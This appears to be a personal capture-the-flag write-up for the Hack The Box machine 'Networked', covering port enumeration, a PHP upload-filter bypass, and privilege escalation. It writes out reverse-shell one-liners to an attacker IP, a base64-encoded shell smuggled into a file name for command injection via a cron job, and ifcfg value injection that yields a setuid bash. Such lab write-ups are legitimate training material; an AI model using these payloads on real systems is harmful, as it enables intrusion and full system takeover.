# Enumeration 

## open ports
```
22/tcp   open   ssh        OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:                                                                                                 
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)                                                                
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)
80/tcp   open   http       Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp  closed https
3301/tcp open   tarantool?
```
### Port 80
PHP/5.4.16
![[Pasted image 20230206143945.png]]
/backup
![[Pasted image 20230206144558.png]]

![[Pasted image 20230206144607.png]]
Website source code
There is a mime check and extension check
![[Pasted image 20230206162424.png]]

![[Pasted image 20230206162435.png]]
we can try to put php first and if the server is misconfigured it can get executed .php.gif
mime check can be bypassed used magic bytes of one of the allowed extension for example GIF8
![[Pasted image 20230206162604.png]]
![[Pasted image 20230206162620.png]]
and file got uploaded

![[Pasted image 20230206162743.png]]

![[Pasted image 20230206162808.png]]
and we have RCE
```
nc -lvnp 9001

bash -c 'exec bash -i &>/dev/tcp/10.10.16.18/9001 <&1'
```

# Privesc 
![[Pasted image 20230206162908.png]]
running linpeas
![[Pasted image 20230206164010.png]]
inside home/guly there is a cronjob file and php file 


![[Pasted image 20230206165429.png]]

$value value is file names inside $path 
![[Pasted image 20230206165802.png]]
so we can create a file with name of 

trying `touch ;curl 10.10.16.18`
![[Pasted image 20230206170636.png]]
we have a hit

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.18/9005 <&1'" | base64
touch ";echo 'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTYuMTgvOTAwNSA8JjEnCg==' | base64 -d | bash"
```

![[Pasted image 20230206172401.png]]
![[Pasted image 20230206172448.png]]
![[Pasted image 20230206174844.png]]

inside payloadofallthethings
![[Pasted image 20230206174810.png]]
but there is a filter in the script can't write ;
`sudo /usr/local/sbin/changename.sh`
![[Pasted image 20230206174901.png]]
![[Pasted image 20230206174927.png]]
adding these to values in the script
`eth0 cp /bin/bash /tmp/pwned`
`eth0 chmod 6777 /tmp/pwned`
![[Pasted image 20230206175205.png]]



---
Tags: #ctf #htb #ifcfg #file_upload #filename_rev
Resources:  [Networked](https://app.hackthebox.com/machines/2